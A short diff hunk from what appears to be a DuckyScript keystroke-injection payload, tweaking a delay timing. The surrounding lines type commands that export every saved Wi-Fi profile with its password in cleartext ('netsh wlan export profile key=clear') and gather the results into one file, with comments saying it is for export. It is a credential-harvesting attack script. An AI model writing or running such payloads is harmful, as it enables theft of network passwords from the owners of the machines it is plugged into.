@@ -28,7 +28,7 @@ REM each profile will be exported to a seperate .xml file, we will soon concatan
 STRING netsh wlan export profile key=clear
 DELAY 200
 ENTER
-DELAY 500
+DELAY 1000
 REM this command will copy all the .xml files to one .txt file that we can export
 STRING copy *.xml wifi.txt
 DELAY 200
